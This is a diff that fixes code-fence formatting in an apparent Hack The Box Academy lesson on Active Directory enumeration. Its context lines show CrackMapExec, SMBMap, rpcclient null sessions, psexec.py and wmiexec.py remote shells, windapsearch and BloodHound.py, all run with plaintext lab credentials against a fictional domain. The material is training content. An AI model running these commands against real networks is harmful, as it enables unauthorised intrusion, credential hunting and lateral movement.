@@ -14,8 +14,7 @@ To follow along, spawn the target at the bottom of this section and SSH to the L
 
 #### CME Help Menu
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ crackmapexec -h
 
 usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--darrell]
@@ -58,8 +57,7 @@ We can see that we can use the tool with MSSQL, SMB, SSH, and WinRM credentials.
 
 #### CME Options (SMB)
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ crackmapexec smb -h
 
 usage: crackmapexec smb [-h] [-id CRED_ID [CRED_ID ...]] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]] [-k]
@@ -108,8 +106,7 @@ We'll start by using the SMB protocol to enumerate users and groups. We will tar
 
 We start by pointing CME at the Domain Controller and using the credentials for the `forend` user to retrieve a list of all domain users. Notice when it provides us the user information, it includes data points such as the [badPwdCount](https://docs.microsoft.com/en-us/windows/win32/adschema/a-badpwdcount) attribute. This is helpful when performing actions like targeted password spraying. We could build a target user list filtering out any users with their `badPwdCount` attribute above 0 to be extra careful not to lock any accounts out.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
 
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
@@ -129,8 +126,7 @@ We can also obtain a complete listing of domain groups. We should save all of ou
 
 #### CME - Domain Group Enumeration
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
@@ -164,8 +160,7 @@ The above snippet lists the groups within the domain and the number of users in 
 
 We can also use CME to target other hosts. Let's check out what appears to be a file server to see what users are logged in currently.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
 
 SMB         172.16.5.130    445    ACADEMY-EA-FILE  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-FILE) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
@@ -189,8 +184,7 @@ We can use the `--shares` flag to enumerate available shares on the remote host 
 
 #### Share Enumeration - Domain Controller
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
 
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
@@ -212,8 +206,7 @@ We see several shares available to us with `READ` access. The `Department Shares
 
 #### Spider\_plus
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
 
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
@@ -227,8 +220,7 @@ SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]     OUTPUT: /tmp/cme_spi
 
 In the above command, we ran the spider against the `Department Shares`. When completed, CME writes the results to a JSON file located at `/tmp/cme_spider_plus/<ip of host>`. Below we can see a portion of the JSON output. We could dig around for interesting files such as `web.config` files or scripts that may contain passwords. If we wanted to dig further, we could pull those files to see what all resides within, perhaps finding some hardcoded credentials or other sensitive information.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ head -n 10 /tmp/cme_spider_plus/172.16.5.5.json 
 
 {
@@ -257,8 +249,7 @@ Like CME, we can use SMBMap and a set of domain user credentials to check for ac
 
 #### SMBMap To Check Access
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
 
 [+] IP: 172.16.5.5:445  Name: inlanefreight.local                               
@@ -278,8 +269,7 @@ The above will tell us what our user can access and their permission levels. Lik
 
 #### Recursive List Of All Directories
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
 
 [+] IP: 172.16.5.5:445  Name: inlanefreight.local                               
@@ -316,8 +306,7 @@ Now that we've covered shares, let's look at `RPCClient`.
 
 Due to SMB NULL sessions (covered in-depth in the password spraying sections) on some of our hosts, we can perform authenticated or unauthenticated enumeration using rpcclient in the INLANEFREIGHT.LOCAL domain. An example of using rpcclient from an unauthenticated standpoint (if this configuration exists in our target domain) would be:
 
-```
-        bash
+```bash
 rpcclient -U "" -N 172.16.5.5
 ```
 
@@ -342,8 +331,7 @@ However, there are accounts that you will notice that have the same RID regardle
 
 #### RPCClient User Enumeration By RID
 
-```
-        shellsession
+```shellsession
 rpcclient $> queryuser 0x457
 
         User Name   :   htb-student
@@ -378,8 +366,7 @@ When we searched for information using the `queryuser` command against the RID `
 
 #### Enumdomusers
 
-```
-        shellsession
+```shellsession
 rpcclient $> enumdomusers
 
 user:[administrator] rid:[0x1f4]
@@ -418,8 +405,7 @@ One of the most useful tools in the Impacket suite is `psexec.py`. Psexec.py is 
 
 To connect to a host with psexec.py, we need credentials for a user with local administrator privileges.
 
-```
-        bash
+```bash
 psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
 ```
 
@@ -433,8 +419,7 @@ Wmiexec.py utilizes a semi-interactive shell where commands are executed through
 
 #### Using wmiexec.py
 
-```
-        bash
+```bash
 wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
 ```
 
@@ -450,8 +435,7 @@ Note that this shell environment is not fully interactive, so each command issue
 
 #### Windapsearch Help
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ windapsearch.py -h
 
 usage: windapsearch.py [-h] [-d DOMAIN] [--dc-ip DC_IP] [-u USER]
@@ -502,8 +486,7 @@ We have several options with Windapsearch to perform standard enumeration (dumpi
 
 #### Windapsearch - Domain Admins
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
 
 [+] Using Domain Controller at: 172.16.5.5
@@ -533,8 +516,7 @@ To identify more potential users, we can run the tool with the `-PU` flag and ch
 
 #### Windapsearch - Privileged Users
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
 
 [+] Using Domain Controller at: 172.16.5.5
@@ -591,8 +573,7 @@ Running `bloodhound-python -h` from our Linux attack host will show us the optio
 
 #### BloodHound.py Options
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ bloodhound-python -h
 
 usage: bloodhound-python [-h] [-c COLLECTIONMETHOD] [-u USERNAME]
@@ -626,8 +607,7 @@ As we can see the tool accepts various collection methods with the `-c` or `--co
 
 #### Executing BloodHound.py
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
 
 INFO: Found AD domain: inlanefreight.local
@@ -649,8 +629,7 @@ The command above executed Bloodhound.py with the user `forend`. We specified ou
 
 #### Viewing the Results
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ls
 
 20220307163102_computers.json  20220307163102_domains.json  20220307163102_groups.json  20220307163102_users.json
